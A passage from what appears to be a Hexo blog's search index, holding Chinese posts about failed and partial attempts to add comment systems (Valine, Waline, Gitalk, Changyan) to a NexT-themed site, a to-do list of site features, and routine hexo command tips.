      <url>/2023/06/30/%E5%85%B3%E4%BA%8E%E5%9C%A8next7-8-0%E4%B8%AD%E5%BB%BA%E8%AE%BE%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<p>于是乎今天忙了一整天尝试在网页中建设评论功能<br>next版本为7.8.0<br>这些是我的尝试过程和失败的结果 最终使用了畅言云评完成了此功能的测试 但还仍需改进<br>接下来是每个评论模块的分别介绍<br><strong>如果要看具体配置过程可以去找我在文章中留下的网址 本人小白一个 不是太懂 谢谢</strong></p><h2 id="valine与waline"><a href="#valine与waline" class="headerlink" title="valine与waline"></a>valine与waline</h2><p>waline由valine衍生而出</p><blockquote><p>Valine 特性</p></blockquote><ul><li>快速</li><li>安全</li><li>Emoji 😉</li><li>无后端实现</li><li>MarkDown 全语法支持</li><li>轻量易用(~15kb gzipped)</li><li>文章阅读量统计 v1.2.0+</li></ul><blockquote><p>Waline 与 Valine 最大的不同就是增加了服务端中间层，解决 Valine 暴露出来的安全问题。同时基于服务端的特性，提供了<strong>邮件通知</strong>、<strong>微信通知</strong>、<strong>评论后台管理</strong>、LeanCloud, MySQL, MongoDB, SQLite, PostgreSQL <strong>多存储服务支持</strong>等诸多特性。 —-<a href="https://zhuanlan.zhihu.com/p/295264916">摘自知乎</a></p></blockquote><p>我两个都试过了，valine方面参考了<a href="https://valine.js.org/">valine官方页面</a> <a href="https://blog.csdn.net/wugenqiang/article/details/105744843">此教程</a><br>waline方面则是参考了<a href="https://waline.js.org/guide/deploy/vps.html">waline官方页面</a> <a href="https://zhuanlan.zhihu.com/p/535607671">这个教程</a></p><p>首先是在尝试时踩的坑:<br>1.valine在部署时使用的leadcloud需使用国际版，否则将需要网站备案<br>2.next7.0+的版本不会内置valine的文件，需要自己下载valine.min.js并配置cdn<br>3.统计<strong>访问人数</strong>和<strong>访问总量</strong>的系统也是由valine支持,想要同时开启会报错</p><p>valine这边在全都按照流程过了一遍确认无误后却发现网页没有评论系统出现<br>只得作罢<br>waline由于next主题中的config.yml没有自带选项 需要复制粘贴<br>在确认过复制到的地区没问题的情况下 hexo s持续爆warning<br>只得作罢×2</p><p>害…过几天再试吧 都是泪啊</p><h2 id="gitalk"><a href="#gitalk" class="headerlink" title="gitalk"></a>gitalk</h2><blockquote><p>Gitalk 特性</p></blockquote><ul><li>使用 GitHub 登录</li><li>支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru]</li><li>支持个人或组织</li><li>无干扰模式（设置 distractionFreeMode 为 true 开启）</li><li>快捷键提交评论 （cmd|ctrl + enter）</li></ul><p>是github官方的评论功能<br>参考了<a href="https://www.jianshu.com/p/02fc71f3633f">这个教程</a></p><p>安装后本地配置显示<strong>network error</strong><br>hexo g hexo d后也是相同的问题<br>搜索后发现是由于github网络地区特殊无法获取端口导致</p><p>但目前没有具体的解决方式</p><h2 id="畅言云评"><a href="#畅言云评" class="headerlink" title="畅言云评"></a>畅言云评</h2><p><a href="https://blog.csdn.net/lcyaiym/article/details/76762074">参考了这个教程</a><br>安装很简单 注册很简单 配置也只要输入appid 和appkey<br>但是具体出来的效果不太行 等待后期优化吧</p>]]></content>
      
      
      <categories>
          
          <category> 日常牢骚 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>目前的进展</title>
      <link href="/2023/06/29/%E7%9B%AE%E5%89%8D%E7%9A%84%E8%BF%9B%E5%B1%95/"/>
      <url>/2023/06/29/%E7%9B%AE%E5%89%8D%E7%9A%84%E8%BF%9B%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>参考<code>https://asdfv1929.github.io/2018/01/25/crash-cheat/</code>完成了标题特效<br>目前想做的玩意：<br>背景音乐播放<br>live2d看板娘<br>背景加上图片 亦或者动效<br>把介绍页摸完<br>完善尾注<br>剩下就是这网站因为铺设在外网<br>加载速度<strong>超级慢</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日常牢骚 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 告示 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编辑小提示</title>
      <link href="/2023/06/28/%E7%BC%96%E8%BE%91%E5%B0%8F%E6%8F%90%E7%A4%BA/"/>
      <url>/2023/06/28/%E7%BC%96%E8%BE%91%E5%B0%8F%E6%8F%90%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<p>所有hexo命令前加上npx<br>gitbash中的复制粘贴是ctrl+install shift+install<br>改完元素后记得<br><code>npx hexo clean   npx hexo g</code><br>本地测试效果用npx hexo s 随后用localhost:4000来连接<br>上传到网络是npx hexo d<br>接下来进一步升级网页<br>三部曲改为<br><code>hexo clean   hexo g   gulp   hexo d</code><br>来优化网页</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
